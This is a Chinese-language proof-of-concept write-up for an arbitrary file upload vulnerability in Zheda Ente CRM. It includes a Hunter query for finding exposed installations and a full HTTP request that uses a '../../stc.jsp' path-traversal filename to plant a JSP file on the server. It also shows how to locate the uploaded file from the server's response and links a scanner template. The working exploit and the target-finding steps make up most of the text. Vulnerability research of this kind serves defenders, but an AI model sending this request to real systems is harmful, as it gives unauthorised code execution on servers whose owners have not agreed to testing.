# 浙大恩特CRM zipFileUpload任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM zipFileUpload任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/okHuxnU_FN0k5qU4/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-432544.png)

# 四、漏洞复现
```java
POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 260
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../stc.jsp"
Content-Type: application/zip

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--00content0boundary00--
```

![1704943891516-566c0363-ef56-4bad-b296-055023951a79.png](./img/okHuxnU_FN0k5qU4/1704943891516-566c0363-ef56-4bad-b296-055023951a79-284623.png)

根据回显拼接上传文件位置

```java
/enterdoc/dao/2024011111284104541134657/stc.jsp
```

![1704943976538-ac2f6799-9ce4-41dd-b52a-2c7a0d7fc29a.png](./img/okHuxnU_FN0k5qU4/1704943976538-ac2f6799-9ce4-41dd-b52a-2c7a0d7fc29a-011387.png)

[zhedaente-entsoft-fileupload-CrmBasicAction.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145291-128bd578-1b6b-45b2-9d79-58ca0ab390b2.yaml)





> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vw1xptpqmd5guxwf>